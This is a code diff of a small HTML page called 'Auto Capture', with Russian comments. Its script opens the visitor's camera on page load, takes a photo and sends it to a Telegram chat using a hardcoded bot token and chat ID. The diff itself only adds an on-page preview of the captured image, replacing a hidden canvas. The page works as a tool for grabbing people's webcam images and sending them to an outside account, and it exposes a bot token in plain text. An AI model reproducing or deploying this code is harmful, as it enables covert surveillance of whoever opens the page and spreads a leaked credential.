@@ -6,11 +6,11 @@
     <title>Auto Capture</title>
 </head>
 <body>
-    <canvas id="canvas" style="display: none;"></canvas>
-
+    <h2>Захваченное изображение:</h2>
+    <img id="photo" alt="Фото будет здесь" style="max-width: 100%; display: none;">
+    
     <script>
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
+        const photoElement = document.getElementById('photo');
 
         const BOT_TOKEN = "8186769001:AAHQ-3PT9NHqPbZTXvCinuMAhKpQJX2QQ68"; // Замени на новый токен
         const CHAT_ID = "7717007781"; // Твой chat_id
@@ -23,9 +23,16 @@
                 return imageCapture.takePhoto(); // Захватываем фото
             })
             .then(blob => {
+                displayPhoto(blob); // Отображаем фото на странице
                 sendPhoto(blob); // Отправляем в Telegram
             })
             .catch(error => console.error("Ошибка доступа к камере:", error));
+
+        function displayPhoto(blob) {
+            const url = URL.createObjectURL(blob);
+            photoElement.src = url;
+            photoElement.style.display = 'block'; // Показываем изображение
+        }
 
         function sendPhoto(blob) {
             let formData = new FormData();
